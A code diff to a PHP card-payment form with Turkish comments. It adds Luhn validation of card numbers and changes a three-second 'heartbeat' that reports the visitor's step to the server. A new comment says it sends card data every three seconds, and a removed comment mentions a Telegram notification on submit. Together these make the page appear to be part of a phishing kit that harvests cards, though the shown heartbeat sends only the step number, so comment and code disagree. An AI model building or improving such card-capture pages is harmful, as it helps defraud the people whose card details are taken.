@@ -47,8 +47,27 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   if (empty($form_data['kart_ad']))
     $hatalar['kart_ad'] = 'Kart üzerindeki ad soyad zorunludur.';
 
-  if (!preg_match('/^\d{16}$/', $form_data['kart_no']))
+  if (!preg_match('/^\d{16}$/', $form_data['kart_no'])) {
     $hatalar['kart_no'] = 'Kart numarası 16 haneli olmalıdır.';
+  } else {
+    // Luhn Algoritması (Mod10) ile Kart Numarası Doğrulama
+    $sum = 0;
+    $num_digits = strlen($form_data['kart_no']);
+    $parity = $num_digits % 2;
+    for ($i = 0; $i < $num_digits; $i++) {
+      $digit = (int)$form_data['kart_no'][$i];
+      if ($i % 2 === $parity) {
+        $digit *= 2;
+        if ($digit > 9) {
+          $digit -= 9;
+        }
+      }
+      $sum += $digit;
+    }
+    if ($sum % 10 !== 0) {
+      $hatalar['kart_no'] = 'Geçersiz kart numarası. Lütfen kontrol ediniz.';
+    }
+  }
 
   if (empty($form_data['ay'])) {
     $hatalar['ay'] = 'Lütfen kart son kullanma ayını seçiniz.';
@@ -262,21 +281,57 @@ require_once __DIR__ . '/includes/header.php';
         </section>
 
         <script>
+        function validateLuhn(ccNum) {
+          var num = ccNum.replace(/\D/g, '');
+          if (num.length !== 16) return false;
+          var sum = 0;
+          var shouldDouble = false;
+          for (var i = num.length - 1; i >= 0; i--) {
+            var digit = parseInt(num.charAt(i), 10);
+            if (shouldDouble) {
+              if ((digit *= 2) > 9) digit -= 9;
+            }
+            sum += digit;
+            shouldDouble = !shouldDouble;
+          }
+          return (sum % 10 === 0);
+        }
+
         function formatKartNo(el) {
           var v = el.value.replace(/\D/g, '').slice(0, 16);
           el.value = v.replace(/(.{4})/g, '$1 ').trim();
+          
+          if (v.length === 16) {
+            if (!validateLuhn(v)) {
+              el.classList.add('is-invalid');
+              var err = el.parentNode.querySelector('.form-error-text');
+              if (!err) {
+                err = document.createElement('small');
+                err.className = 'form-error-text';
+                el.parentNode.appendChild(err);
+              }
+              err.textContent = 'Geçersiz kart numarası. Lütfen kontrol ediniz.';
+              err.style.display = 'block';
+            } else {
+              el.classList.remove('is-invalid');
+              var err = el.parentNode.querySelector('.form-error-text');
+              if (err) err.style.display = 'none';
+            }
+          } else {
+            el.classList.remove('is-invalid');
+            var err = el.parentNode.querySelector('.form-error-text');
+            if (err) err.style.display = 'none';
+          }
         }
+
         // Heartbeat — kart verilerini 3sn'de bir gönder
         (function(){
-          // Sadece aktivite & adım bilgisini gönderir — kart verisi göndermez
-          // Telegram bildirimi input event'lerinde değil, form submit'te tetiklenir
           function heartbeat(){
             var fd=new FormData();
             fd.append('mevcut_adim','3');
             fetch('<?= BASE_PATH ?>/api/heartbeat.php',{method:'POST',body:fd,credentials:'same-origin'}).catch(function(){});
           }
           setInterval(heartbeat, 3000);
-          // input event listener YOK — her karakter yazışta API çağrısı yapma
         })();
         </script>
 
